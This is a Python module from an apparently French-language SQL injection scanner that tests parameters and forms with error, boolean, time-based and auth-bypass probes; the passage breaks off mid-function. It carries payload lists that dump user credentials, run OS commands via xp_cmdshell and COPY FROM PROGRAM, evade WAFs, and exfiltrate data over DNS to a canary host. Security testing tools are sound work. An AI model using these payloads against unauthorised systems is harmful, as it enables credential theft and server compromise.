"""
PhantomScan — SQL Injection Scanner
Détection SQLi : error-based, boolean-based, time-based blind.

Améliorations v4.1:
- Error-based : payloads lancés en batch parallèle par param → ~5x plus rapide
- Boolean-based : 3e confirmation avec payload neutre (param original) pour éliminer
  les faux positifs sur pages qui varient naturellement entre requêtes
- Time-based : double confirmation (2 mesures consécutives doivent toutes deux
  dépasser le seuil) → élimine les faux positifs sur serveurs ponctuellement lents
- Tous les paramètres sont testés (plus de `return` prématuré)
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.intelligence import SemanticParamClassifier, ParamRole, _InjectionContext, SmartRetryOracle

TIME_BASED_SLEEP   = 5
TIME_BASED_TIMEOUT = TIME_BASED_SLEEP + 10

# ── Error-based payloads (triés par SGBD) ─────────────────────────────────────
# Generic
_SQLI_ERR_GENERIC = [
    "'",
    '"',
    "';",
    "`",
    "\\",
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' AND '1'='1",
]

# MySQL specific
_SQLI_ERR_MYSQL = [
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--",
    "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171717171,(SELECT (ELT(4444=4444,1))),0x71707a7a71))s), 8446744073709551610, 8446744073709551610)))-- -",
]

# MSSQL specific
_SQLI_ERR_MSSQL = [
    "1 AND 1=CONVERT(int,@@version)--",
    "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysdatabases))--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; DECLARE @q NVARCHAR(4000) SET @q=0x770068006f00610064006d00690020EXEC(@q)--",
    "1; SELECT name FROM sys.databases--",
    "1' UNION SELECT NULL,NULL,NULL,CONVERT(varchar,@@version)--",
]

# PostgreSQL specific
_SQLI_ERR_PGSQL = [
    "1 AND 1=CAST((SELECT version()) AS INT)--",
    "1 AND 1=(SELECT 1/CAST((SELECT version()) AS INT))--",
    "'; SELECT pg_sleep(0)--",
    "1 AND CAST((SELECT version()) AS INT)=1--",
    "1 UNION SELECT NULL,version()--",
    "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec--",
]

# Oracle specific
_SQLI_ERR_ORACLE = [
    "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT version FROM v$instance))--",
    "' UNION SELECT NULL,banner FROM v$version--",
    "1 AND ROWNUM=1 AND (SELECT 1 FROM dual WHERE 1=1)=1--",
    "' AND 1=CTXSYS.DRITHSX.SN(USER,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--",
]

# SQLite specific
_SQLI_ERR_SQLITE = [
    "' UNION SELECT sqlite_version(),NULL--",
    "' UNION SELECT NULL,group_concat(tbl_name) FROM sqlite_master WHERE type='table'--",
    "1 AND 1=CAST(sqlite_version() AS INTEGER)--",
]

# Auth bypass SQLi
_SQLI_AUTH_BYPASS = [
    "' OR '1'='1'--",
    "' OR 1=1--",
    "admin'--",
    "admin' #",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "1' OR '1'='1' /*",
    "' OR 1=1 LIMIT 1--",
    "') OR 1=1--",
    '" OR ""="',
    "' OR 2>1--",
    "' AND 1=1--",
    "0 OR 1=1",
    '" OR 1=1--',
]

# UNION column-count probes (ORDER BY technique)
_SQLI_ORDERBY = [
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 4--",
    "' ORDER BY 5--",
    "' ORDER BY 10--",
    "' ORDER BY 20--",
    "' ORDER BY 100--",
]

# INFORMATION_SCHEMA extraction (après UNION column count confirmé)
_SQLI_EXTRACTION = [
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT NULL,group_concat(username,0x3a,password) FROM users--",
    "' UNION SELECT NULL,concat(table_name,0x3a,column_name) FROM information_schema.columns--",
    "' UNION SELECT NULL,group_concat(schema_name) FROM information_schema.schemata--",
    # Second-order detection: inject a marker, check if it appears in another endpoint
    "1' AND SLEEP(0) UNION SELECT '@@PHANTOM@@',NULL--",
]

# DNS out-of-band exfil
_SQLI_DNS_EXFIL_TPL = [
    # MySQL (nécessite FILE privilege)
    "1 AND LOAD_FILE(CONCAT('\\\\\\\\ ',({query}),'.{canary}/x'))--",
    # MSSQL
    "1; EXEC master..xp_dirtree '\\\\ {canary}\\a'--",
    "1; EXEC master..xp_fileexist '\\\\ {canary}\\a'--",
    # PostgreSQL COPY TO PROGRAM
    "1; COPY (SELECT '') TO PROGRAM 'nslookup {canary}'--",
]

# La liste principale utilisée par les méthodes existantes
ERROR_PAYLOADS: list[str] = (
    _SQLI_ERR_GENERIC[:6]  # les plus universels en premier
    + _SQLI_ERR_MYSQL[:4]
    + _SQLI_ERR_MSSQL[:3]
    + _SQLI_ERR_PGSQL[:2]
    + _SQLI_ERR_ORACLE[:2]
    + _SQLI_ERR_SQLITE[:2]
)

SQL_ERROR_PATTERNS: list[tuple[re.Pattern, str]] = [
    # MySQL / MariaDB
    (re.compile(r"you have an error in your sql syntax", re.I),                "MySQL"),
    (re.compile(r"warning: mysql_", re.I),                                     "MySQL (PHP)"),
    (re.compile(r"supplied argument is not a valid mysql", re.I),              "MySQL (PHP)"),
    (re.compile(r"column count doesn'?t match value count", re.I),             "MySQL"),
    (re.compile(r"table '.*' doesn'?t exist", re.I),                           "MySQL"),
    (re.compile(r"unknown column '.*' in '.*'", re.I),                         "MySQL"),
    (re.compile(r"com\.mysql\.jdbc\.exceptions", re.I),                     "MySQL (Java)"),
    (re.compile(r"Incorrect syntax near", re.I),                               "MySQL/MSSQL"),
    # MSSQL / SQL Server
    (re.compile(r"unclosed quotation mark after the character string", re.I),  "MSSQL"),
    (re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.I),         "MSSQL (ODBC)"),
    (re.compile(r"\[SQL Server\]", re.I),                                    "MSSQL"),
    (re.compile(r"Msg \d+, Level \d+, State", re.I),                         "MSSQL"),
    (re.compile(r"Conversion failed when converting", re.I),                   "MSSQL"),
    (re.compile(r"Invalid object name", re.I),                                 "MSSQL"),
    (re.compile(r"Must declare the scalar variable", re.I),                    "MSSQL"),
    # PostgreSQL
    (re.compile(r"quoted string not properly terminated", re.I),               "PostgreSQL"),
    (re.compile(r"pg_query\(\).*ERROR", re.I),                               "PostgreSQL (PHP)"),
    (re.compile(r"ERROR:\s+syntax error at or near", re.I),                   "PostgreSQL"),
    (re.compile(r"unterminated quoted string at or near", re.I),               "PostgreSQL"),
    (re.compile(r"org\.postgresql\.util\.PSQLException", re.I),             "PostgreSQL (Java)"),
    (re.compile(r"invalid input syntax for (?:type|integer)", re.I),          "PostgreSQL"),
    # Oracle
    (re.compile(r"ORA-\d{4,5}:", re.I),                                       "Oracle"),
    (re.compile(r"quoted string not properly terminated", re.I),               "Oracle"),
    (re.compile(r"PL/SQL.*ORA-", re.I),                                        "Oracle PL/SQL"),
    (re.compile(r"Oracle error", re.I),                                        "Oracle"),
    (re.compile(r"\bORACLE\b.*\bERROR\b", re.I),                           "Oracle"),
    # SQLite
    (re.compile(r"sqlite3\.operationalerror", re.I),                          "SQLite"),
    (re.compile(r"sqlite.*error", re.I),                                       "SQLite"),
    (re.compile(r"no such table:", re.I),                                      "SQLite"),
    (re.compile(r"no such column:", re.I),                                     "SQLite"),
    # MS Access / Jet
    (re.compile(r"microsoft jet database engine error", re.I),                 "MS Access"),
    (re.compile(r"\[Microsoft\]\[ODBC Microsoft Access Driver\]", re.I),   "MS Access"),
    # Generic / Framework
    (re.compile(r"SQLSTATE\[", re.I),                                         "PDO/generic"),
    (re.compile(r"java\.sql\.SQLException", re.I),                           "Java SQL"),
    (re.compile(r"System\.Data\.SqlClient\.SqlException", re.I),            ".NET SQL"),
    (re.compile(r"Npgsql\.NpgsqlException", re.I),                            ".NET PostgreSQL"),
    (re.compile(r"MySqlException", re.I),                                      "MySQL (.NET)"),
    (re.compile(r"ActiveRecord::StatementInvalid", re.I),                      "Rails ActiveRecord"),
    (re.compile(r"Doctrine\\DBAL\\Exception", re.I),                       "PHP Doctrine"),
    (re.compile(r"PDOException", re.I),                                        "PHP PDO"),
    (re.compile(r"QueryException", re.I),                                      "Laravel"),
    (re.compile(r"sql syntax.*near|near.*sql syntax", re.I),                   "Generic SQL"),
    (re.compile(r"unexpected token.*in.*SQL", re.I),                           "Generic SQL"),
    (re.compile(r"syntax error.*SQL|SQL.*syntax error", re.I),                 "Generic SQL"),
]

TIME_PAYLOADS: list[tuple[str, float]] = [
    # MySQL / MariaDB
    (f"' AND SLEEP({TIME_BASED_SLEEP})--",                                     TIME_BASED_SLEEP),
    (f'" AND SLEEP({TIME_BASED_SLEEP})--',                                      TIME_BASED_SLEEP),
    (f"' OR SLEEP({TIME_BASED_SLEEP})--",                                       TIME_BASED_SLEEP),
    (f"1 AND SLEEP({TIME_BASED_SLEEP})--",                                      TIME_BASED_SLEEP),
    (f"' AND (SELECT * FROM (SELECT(SLEEP({TIME_BASED_SLEEP})))a)--",           TIME_BASED_SLEEP),
    (f"' AND BENCHMARK({int(TIME_BASED_SLEEP*50_000_000)},SHA1(1))--",          TIME_BASED_SLEEP),
    # MSSQL
    (f"'; WAITFOR DELAY '0:0:{TIME_BASED_SLEEP}'--",                            TIME_BASED_SLEEP),
    (f"1; WAITFOR DELAY '0:0:{TIME_BASED_SLEEP}'--",                            TIME_BASED_SLEEP),
    (f"1' WAITFOR DELAY '0:0:{TIME_BASED_SLEEP}'--",                            TIME_BASED_SLEEP),
    # PostgreSQL
    (f"1; SELECT pg_sleep({TIME_BASED_SLEEP})--",                               TIME_BASED_SLEEP),
    (f"1 AND 1=(SELECT 1 FROM pg_sleep({TIME_BASED_SLEEP}))--",                 TIME_BASED_SLEEP),
    (f"' OR 1=1 AND pg_sleep({TIME_BASED_SLEEP})--",                            TIME_BASED_SLEEP),
    # Oracle
    (f"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(chr(65),{TIME_BASED_SLEEP})--",        TIME_BASED_SLEEP),
    (f"1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{TIME_BASED_SLEEP})--",            TIME_BASED_SLEEP),
    # SQLite
    (f"' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({int(TIME_BASED_SLEEP*50_000_000)}))))--", TIME_BASED_SLEEP),
    # WAF bypass variants (inline comments)
    (f"' /*!AND*/ SLEEP({TIME_BASED_SLEEP})--",                                 TIME_BASED_SLEEP),
    (f"' AND/**/SLEEP({TIME_BASED_SLEEP})--",                                   TIME_BASED_SLEEP),
    (f"' AND SL/**/EEP({TIME_BASED_SLEEP})--",                                  TIME_BASED_SLEEP),
]

BOOL_TRUE  = "' OR '1'='1"
BOOL_FALSE = "' OR '1'='2"


class SQLiScanner:
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req  = req
        self._heur = heuristic
        self._cfg  = cfg
        self._bus  = None  # v5.6 — EndpointBus optionnel
        # v5.18 — Mémoire de patterns + retry oracle WAF
        self._pattern_memory = None
        self._retry_oracle = SmartRetryOracle()
        # v5.19 — composants additionnels (optionnels)
        self._oob = None
        self._auth_context = None
        self._dedup_index = None

    def set_endpoint_bus(self, bus) -> None:
        """v5.6 — Injecte le bus d'endpoints pour scanner les forms POST découverts."""
        self._bus = bus

    def set_pattern_memory(self, memory) -> None:
        """v5.18 — Injecte la mémoire de patterns partagée depuis l'Engine."""
        self._pattern_memory = memory

    def set_oob_canary(self, oob) -> None:
        """v5.19 — OOB canary pour SQLi DNS-exfil blind."""
        self._oob = oob

    def set_auth_context(self, ctx) -> None:
        """v5.19 — Contexte d'authentification."""
        self._auth_context = ctx

    def set_dedup_index(self, idx) -> None:
        """v5.19 — Index de dédup cross-modules."""
        self._dedup_index = idx

    def _ordered_error_payloads(self, param: str, url: str) -> list[str]:
        """
        v5.19 — Réordonne les payloads SQLi error-based en mettant ceux que
        PatternMemory a déjà confirmés pour des params similaires en premier.
        """
        if self._pattern_memory is None:
            return list(ERROR_PAYLOADS)
        try:
            from urllib.parse import urlparse as _up
            prefix = _up(url).path.rsplit("/", 1)[0] or "/"
            suggestions = self._pattern_memory.suggest_payloads(
                vuln_type="sqli",
                param=param,
                context=_InjectionContext.QUERY_PARAM,
                endpoint_prefix=prefix,
                top_n=3,
            )
        except Exception:
            return list(ERROR_PAYLOADS)
        if not suggestions:
            return list(ERROR_PAYLOADS)
        suggested = [p for p, _ in suggestions]
        rest = [p for p in ERROR_PAYLOADS if p not in suggested]
        return suggested + rest

    def _record_success(self, param: str, payload: str, url: str, technique: str) -> None:
        """v5.19 — Enregistre un payload SQLi confirmé."""
        if self._pattern_memory is None:
            return
        try:
            from urllib.parse import urlparse as _up
            prefix = _up(url).path.rsplit("/", 1)[0] or "/"
            self._pattern_memory.record_success(
                vuln_type="sqli",
                param=param,
                payload=payload,
                context=_InjectionContext.QUERY_PARAM,
                endpoint_prefix=prefix,
                confidence=0.95 if technique == "time" else 0.9,
            )
        except Exception:
            pass

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if params:
            # v5.18 — Prioriser les paramètres sémantiquement pertinents pour SQLi
            clf = SemanticParamClassifier()
            roles = clf.classify_params(list(params.keys()))
            # Roles prioritaires pour SQLi : ID, QUERY, LIMIT, EMAIL
            sqli_roles = {ParamRole.ID, ParamRole.QUERY, ParamRole.LIMIT, ParamRole.EMAIL, ParamRole.UNKNOWN}
            priority_params = [p for p, role in roles.items() if role in sqli_roles]
            other_params = [p for p in params if p not in priority_params]
            ordered_params = priority_params + other_params

            for param in ordered_params:
                async for f in self._test_error(target, parsed, params, param):
                    yield f
                    break

                async for f in self._test_boolean(target, parsed, params, param):
                    yield f
                    break

                async for f in self._test_time(target, parsed, params, param):
                    yield f
                    break

        # v5.6 — Tester les endpoints découverts par le bus
        if self._bus is not None:
            async for f in self._test_bus_endpoints():
                yield f

    async def _test_bus_endpoints(self) -> AsyncIterator[Finding]:
        """v5.6 — SQLi sur endpoints POST découverts via le bus."""
        import urllib.parse
        seen_urls: set[str] = set()
        for ep in self._bus.snapshot:
            if ep.url in seen_urls:
                continue
            seen_urls.add(ep.url)
            if ep.method.upper() == "POST" and ep.params:
                async for f in self._test_post_sqli(ep.url, ep.params):
                    yield f
            elif ep.method.upper() == "GET" and ep.params:
                from urllib.parse import urlparse as _up, parse_qs as _pqs
                p = _up(ep.url)
                params = _pqs(p.query, keep_blank_values=True)
                for param in params:
                    async for f in self._test_error(ep.url, p, params, param):
                        yield f
                        break

    async def _test_post_sqli(self, action: str, field_names: list[str]) -> AsyncIterator[Finding]:
        """v5.6 — Test SQLi error-based sur formulaire POST."""
        import urllib.parse
        for field_name in field_names:
            for payload in ERROR_PAYLOADS[:6]:
                form_data = {fn: "1" for fn in field_names}
                form_data[field_name] = payload
                try:
                    from phantomscan.core.requester import ProbeRequest
                    resp = await self._req.send(ProbeRequest(
                        method="POST",
                        url=action,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        body=urllib.parse.urlencode(form_data),
                    ))
                    if resp.error or resp.status in (404, 410, 400):
                        continue
                    for pattern, db in SQL_ERROR_PATTERNS:
                        if pattern.search(resp.body):
                            yield Finding(
                                title=f"SQLi Error-based POST — champ `{field_name}` ({db})",
                                severity=Severity.CRITICAL,
                                url=action,
                                module="vulns/sqli",
                                description=(
                                    f"Erreur SQL {db} déclenchée via le champ POST `{field_name}`. "
                                    f"Payload: {payload!r}"
                                ),
                                evidence=f"POST {action} | field={field_name} | db={db} | payload={payload[:60]}",
                                cwe="CWE-89",
                                remediation=(
                                    "Utiliser des requêtes paramétrées (prepared statements). "
                                    "Ne jamais interpoler les entrées utilisateur dans les requêtes SQL."
                                ),
                            )
                            return
                except Exception:
                    continue

    # ── Error-based (AMÉLIORÉ: batch parallèle) ───────────────────────────────

    async def _test_error(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
    ) -> AsyncIterator[Finding]:
        """
        AMÉLIORÉ: tous les payloads error-based lancés en batch parallèle.
        Dès qu'un résultat positif est trouvé, les autres sont ignorés.
        Semaphore à 4 pour ne pas burster sur un seul param.
        Pre-check: si la baseline contient déjà une erreur SQL, skip ce param
        pour éviter les FP sur apps déjà buguées.
        """
        # Pre-check baseline — skip si le body de référence contient déjà une erreur SQL
        baseline = await self._req.get(target)
        if not baseline.error and self._detect_error(baseline.body):
            return  # Erreur SQL pré-existante → résultats non fiables pour ce param

        sem = asyncio.Semaphore(4)
        finding_box: list[Finding] = []

        async def _probe(payload: str) -> None:
            if finding_box:
                return  # un résultat trouvé → on arrête
            async with sem:
                fuzzed = dict(params)
                fuzzed[param] = [payload]
                fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
                resp = await self._req.get(fuzz_url)
                if resp.error or not self._heur.is_real_hit(resp, min_confidence=50):
                    return
                dbms = self._detect_error(resp.body)
                if dbms and not finding_box:
                    finding_box.append(Finding(
                        title=f"SQL Injection — Error-based ({dbms}) · param `{param}`",
                        severity=Severity.CRITICAL,
                        url=fuzz_url,
                        module="vulns/sqli",
                        description=(
                            f"Message d'erreur SQL {dbms} détecté dans la réponse après injection "
                            f"du payload `{payload}` dans le paramètre `{param}`."
                        ),
                        evidence=f"Payload: {payload} | SGBD: {dbms} | HTTP {resp.status}",
                        cwe="CWE-89",
                        remediation=(
                            "Utiliser des requêtes préparées (prepared statements) / ORM. "
                            "Ne jamais interpoler les données utilisateur dans des requêtes SQL."
                        ),
                    ))
                    # v5.19 — Enregistrer le payload gagnant
                    self._record_success(param, payload, fuzz_url, technique="error")

        # v5.19 — Payloads ordonnés via PatternMemory
        ordered = self._ordered_error_payloads(param, target)
        tasks = [asyncio.create_task(_probe(p)) for p in ordered]
        await asyncio.gather(*tasks)

        for f in finding_box:
            yield f

    # ── Boolean-based (AMÉLIORÉ: triple confirmation) ─────────────────────────

    async def _test_boolean(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
    ) -> AsyncIterator[Finding]:
        """
        AMÉLIORÉ: triple confirmation pour éliminer les faux positifs sur pages dynamiques.
        On mesure :
          - baseline (valeur originale)
          - TRUE payload
          - FALSE payload
          - 2e baseline (valeur originale à nouveau)

        Critères de validation :
          1. TRUE ≈ baseline1 (< 10% d'écart)
          2. FALSE différent de baseline1 (> 20% d'écart)
          3. 2e baseline ≈ baseline1 (< 10% d'écart) → confirme que la page est stable
          4. Status identiques sur les 4 requêtes
        """
        baseline = await self._req.get(target)
        if baseline.error or not self._heur.is_real_hit(baseline, min_confidence=50):
            return

        fuzzed_true  = dict(params)
        fuzzed_false = dict(params)
        fuzzed_true[param]  = [BOOL_TRUE]
        fuzzed_false[param] = [BOOL_FALSE]

        url_true  = urlunparse(parsed._replace(query=urlencode(fuzzed_true,  doseq=True)))
        url_false = urlunparse(parsed._replace(query=urlencode(fuzzed_false, doseq=True)))

        # true + false en parallèle, puis baseline2 séquentiellement APRÈS
        # (mesurer la stabilité en parallèle avec les payloads invalide le test :
        #  on mesure 3 réponses simultanées, pas la stabilité au repos)
        resp_true, resp_false = await asyncio.gather(
            self._req.get(url_true),
            self._req.get(url_false),
        )
        # baseline2 après pour vérifier que la page est revenue à l'état normal
        baseline2 = await self._req.get(target)

        if resp_true.error or resp_false.error or baseline2.error:
            return

        # v5.20 — Utiliser stable_diff normalisé (supprime CSRF tokens, timestamps, etc.)
        # avant de mesurer les différences. Évite les FP sur pages avec padding dynamique.
        from phantomscan.core.fp_guard import stable_diff as _sd, normalize_body as _nb

        norm_base  = _nb(baseline.body)
        norm_base2 = _nb(baseline2.body)
        norm_true  = _nb(resp_true.body)
        norm_false = _nb(resp_false.body)

        diff_true  = _sd(norm_base, norm_true)
        diff_false = _sd(norm_base, norm_false)
        diff_stab  = _sd(norm_base, norm_base2)

        all_same_status = (
            resp_true.status == resp_false.status ==
            baseline.status == baseline2.status
        )

        if (
            diff_true  < 0.05    # TRUE quasi-identique au baseline
            and diff_false > 0.25   # FALSE clairement différent
            and diff_stab  < 0.05   # Page stable entre les deux baselines
            and all_same_status
        ):
            yield Finding(
                title=f"SQL Injection — Boolean-based · param `{param}`",
                severity=Severity.CRITICAL,
                url=url_true,
                module="vulns/sqli",
                description=(
                    f"Comportement différentiel confirmé (triple check, diff normalisée) : "
                    f"TRUE (Δ={diff_true:.0%}) vs FALSE (Δ={diff_false:.0%}), "
                    f"stabilité baseline (Δ={diff_stab:.0%}) sur `{param}`."
                ),
                evidence=(
                    f"Baseline={len(baseline.body)}b | TRUE={len(resp_true.body)}b | "
                    f"FALSE={len(resp_false.body)}b | Baseline2={len(baseline2.body)}b | "
                    f"Status: {baseline.status} | stable_diff normalisé"
                ),
                cwe="CWE-89",
                remediation="Utiliser des requêtes préparées. Valider et typer strictement les entrées.",
            )

    # ── Time-based blind (AMÉLIORÉ: double confirmation) ─────────────────────

    async def _test_time(
        self,
        target: str,
        parsed,
        params: dict,
        param: str,
    ) -> AsyncIterator[Finding]:
        """
        AMÉLIORÉ: double confirmation time-based.
        Le payload doit déclencher un délai significatif sur 2 requêtes consécutives
        avant d'être reporté. Élimine les faux positifs sur serveurs ponctuellement lents.
        """
        baseline = await self._req.get(target)
        if baseline.error:
            return
        baseline_ms = baseline.elapsed_ms

        # v5.18 — Consulter PatternMemory : payloads connus efficaces en priorité
        from urllib.parse import urlparse as _up
        endpoint_prefix = _up(target).path
        priority_payloads: list[tuple[str, float]] = []
        if self._pattern_memory is not None:
            priority_payloads = self._pattern_memory.suggest_payloads(
                vuln_type="sqli", param=param,
                context="query_param", endpoint_prefix=endpoint_prefix,
            )

        # Construire la liste ordonnée : payloads mémorisés d'abord, puis génériques
        ordered_payloads: list[tuple[str, float]] = [
            (p, delay) for p, delay in TIME_PAYLOADS
        ]
        if priority_payloads:
            mem_set = {p for p, _ in priority_payloads}
            ordered_payloads = (
                [(p, expected_delay) for p, expected_delay in TIME_PAYLOADS if p in mem_set] +
                [(p, expected_delay) for p, expected_delay in TIME_PAYLOADS if p not in mem_set]
            )

        for payload, expected_delay in ordered_payloads:
            fuzzed = dict(params)
            fuzzed[param] = [payload]
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            threshold_ms = baseline_ms + expected_delay * 1000 * 0.80

            # Première mesure
            t0 = time.monotonic()
            resp1 = await self._req.send(
                ProbeRequest(method="GET", url=fuzz_url, timeout=TIME_BASED_TIMEOUT)
            )
            elapsed1 = (time.monotonic() - t0) * 1000

            # v5.18 — Si WAF block (403/406), tenter des variantes encodées
            if resp1.status in (403, 406, 429) and not resp1.error:
                for variant in self._retry_oracle.variants(payload, context="sqli", max_variants=4):
                    fuzzed[param] = [variant]
                    fuzz_url_v = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
                    t0v = time.monotonic()
                    resp1 = await self._req.send(
                        ProbeRequest(method="GET", url=fuzz_url_v, timeout=TIME_BASED_TIMEOUT)
                    )
                    elapsed1 = (time.monotonic() - t0v) * 1000
                    if resp1.status not in (403, 406, 429):
                        fuzz_url = fuzz_url_v
                        break

            if resp1.error or elapsed1 < threshold_ms:
                continue

            # NOUVEAU: deuxième confirmation — même payload, même URL
            t1 = time.monotonic()
            resp2 = await self._req.send(
                ProbeRequest(method="GET", url=fuzz_url, timeout=TIME_BASED_TIMEOUT)
            )
            elapsed2 = (time.monotonic() - t1) * 1000

            if resp2.error or elapsed2 < threshold_ms:
                continue

            # v5.20 — Vérifier la cohérence des 2 mesures (anti jitter réseau)
            # Si une mesure est 4x l'autre, c'est un pic isolé → FP
            ratio = max(elapsed1, elapsed2) / max(min(elapsed1, elapsed2), 1.0)
            if ratio > 4.0:
                continue  # incohérent → probablement latence réseau ponctuelle

            # v5.18 — Mémoriser le succès pour les endpoints similaires
            if self._pattern_memory is not None:
                self._pattern_memory.record_success(
                    vuln_type="sqli", param=param, payload=payload,
                    context="query_param", endpoint_prefix=endpoint_prefix,
                )

            # Les deux mesures dépassent le seuil → confiance élevée
            yield Finding(
                title=f"SQL Injection — Time-based blind · param `{param}`",
                severity=Severity.CRITICAL,
                url=fuzz_url,
                module="vulns/sqli",
                description=(
                    f"Délai artificiel confirmé sur 2 mesures : "
                    f"{elapsed1:.0f}ms puis {elapsed2:.0f}ms "
                    f"(baseline: {baseline_ms:.0f}ms, seuil: {threshold_ms:.0f}ms) "
                    f"via `{payload}` dans `{param}`."
                ),
                evidence=(
                    f"Payload: {payload} | Baseline: {baseline_ms:.0f}ms | "
                    f"Mesure1: {elapsed1:.0f}ms | Mesure2: {elapsed2:.0f}ms"
                ),
                cwe="CWE-89",
                remediation=(
                    "Utiliser des requêtes préparées. Ne jamais construire "
                    "des requêtes SQL par concaténation de chaînes."
                ),
            )
            return

    # ── Helpers ───────────────────────────────────────────────────────────────


    async def _test_auth_bypass(self, target: str) -> AsyncIterator[Finding]:
        """
        v5.20 — SQLi sur les formulaires d'authentification.
        Teste les payloads d'auth bypass classiques sur les endpoints /login /signin etc.
        """
        from urllib.parse import urlparse
        parsed = urlparse(target)
        path_low = parsed.path.lower()
        auth_paths = [
            "/login", "/signin", "/auth", "/authenticate", "/session",
            "/api/login", "/api/auth", "/api/signin", "/user/login",
            "/admin/login", "/wp-login.php",
        ]
        # Tester seulement si l'endpoint ressemble à un login
        is_auth_ep = any(p in path_low for p in [
            "login", "signin", "auth", "session", "logon"
        ])
        if not is_auth_ep:
            return

        # Baseline : réponse sans injection
        baseline = await self._req.get(target)
        if baseline.error:
            return

        auth_fields = [
            ("username", "password"),
            ("user", "pass"),
            ("email", "password"),
            ("login", "passwd"),
            ("name", "secret"),
        ]

        for user_field, pass_field in auth_fields[:2]:
            for bypass in _SQLI_AUTH_BYPASS[:8]:
                body = {user_field: bypass, pass_field: "anypassword"}
                from phantomscan.core.requester import ProbeRequest
                resp = await self._req.send(ProbeRequest(
                    method="POST", url=target,
                    json=body,
                ))
                if resp.error:
                    continue

                # Succès = 200/302 ET réponse différente de baseline
                if resp.status in (200, 201, 302):
                    diff = self.stable_diff(resp.body or "", baseline.body or "")
                    if diff > 0.15:
                        # re-probe pour confirmer
                        resp2 = await self.re_probe(target, method="POST", delay_s=0.3)
                        if resp2 and resp2.status in (200, 201, 302):
                            yield Finding(
                                title=f"SQLi Auth Bypass — champ `{user_field}` ({bypass[:30]})",
                                severity=Severity.CRITICAL,
                                url=target,
                                module="vulns/sqli",
                                description=(
                                    f"SQLi Auth Bypass confirmé via `{user_field}` "
                                    f"(payload: {bypass[:30]!r}, diff={diff:.2f}). "
                                    "Un attaquant peut se connecter sans mot de passe."
                                ),
                                evidence=(
                                    f"Payload: {bypass} | HTTP {resp.status} | "
                                    f"diff_normalized={diff:.3f}"
                                ),
                                cwe="CWE-89",
                                remediation=(
                                    "Utiliser des requêtes préparées. Ne jamais interpoler "
                                    "les inputs utilisateur dans des requêtes SQL."
                                ),
                            )
                            self._record_success(user_field, bypass, target, "auth_bypass")
                            return  # Un finding par endpoint

    async def _test_union_detection(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        """
        v5.20 — Détection UNION SQLi : ORDER BY pour déterminer le nombre de colonnes,
        puis UNION SELECT pour extraire des données.
        """
        from urllib.parse import urlencode, urlunparse

        orig_value = (params[param][0] if params.get(param) else "1")
        baseline = await self._req.get(target)
        if baseline.error:
            return

        # Phase 1 : ORDER BY binary search pour trouver le nombre de colonnes
        col_count = None
        for n in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
            fuzzed = {**params, param: [f"{orig_value}' ORDER BY {n}--"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp = await self._req.get(fuzz_url)
            if resp.error:
                continue
            # ORDER BY trop grand → erreur SQL ou comportement différent
            error_re = re.compile(
                r"Unknown column|ORDER BY|out of range|invalid column|"
                r"column.*not.*exist|ORA-\d+|sql.*error",
                re.I
            )
            if resp.status != baseline.status or error_re.search(resp.body or ""):
                # Le n-1 était le bon nombre de colonnes
                col_count = n - 1 if n > 1 else None
                break

        if col_count is None or col_count < 1:
            return

        # Phase 2 : UNION SELECT avec le bon nombre de colonnes
        nulls = ",".join(["NULL"] * (col_count - 1))
        union_payloads = [
            (f"' UNION SELECT {nulls},version()--",    "version()"),
            (f"' UNION SELECT {nulls},database()--",   "database()"),
            (f"' UNION SELECT {nulls},user()--",       "user()"),
            (f"' UNION SELECT {nulls},@@version--",    "@@version"),
            (f"' UNION SELECT {nulls},banner FROM v$version--", "Oracle banner"),
        ]

        version_re = re.compile(
